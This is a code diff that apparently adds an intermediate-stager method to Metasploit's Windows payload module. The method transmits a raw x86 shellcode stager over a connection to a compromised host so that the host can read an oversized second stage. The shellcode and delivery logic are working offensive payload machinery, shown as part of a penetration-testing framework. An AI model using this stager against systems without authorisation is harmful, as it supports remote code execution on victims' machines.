@@ -58,4 +58,38 @@ module Msf::Payload::Windows
 		return false
 	end
 
+	#
+	# For windows, we check to see if the stage that is being sent is larger
+	# than a certain size.  If it is, we transmit another stager that will
+	# ensure that the entire stage is read in.
+	#
+	def handle_intermediate_stage(conn, payload)
+		return if (payload.length < 1300)
+
+		# The mid-stage works by reading in a four byte length in host-byte
+		# order (which represents the length of the stage).  Following that, it
+		# reads in the entire second stage until all bytes are read.
+		midstager = 
+			"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
+			"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a" +
+			"\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x71" +
+			"\x3c\x01\xee\x55\x89\xe3\x6a\x00\x6a\x04\x53\x57\xff\xd6\x2b\x23" +
+			"\x66\x81\xe4\xfc\xff\x89\xe5\x55\x6a\x00\xff\x33\x55\x57\xff\xd6" +
+			"\x01\xc5\x29\x03\x85\xc0\x75\xf0\xc3"
+
+		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
+
+		# Transmit our intermediate stager
+		conn.put(midstager)
+
+		# Sleep to give enough time for the remote side to receive and read the
+		# midstage so that we don't accidentally read in part of the second
+		# stage.
+		Rex::ThreadSafe.sleep(1.5)
+	
+		# The mid-stage requires that we transmit a four byte length field that
+		# it will use as the length of the subsequent stage.
+		conn.put([ payload.length ].pack('V'))
+	end
+
 end
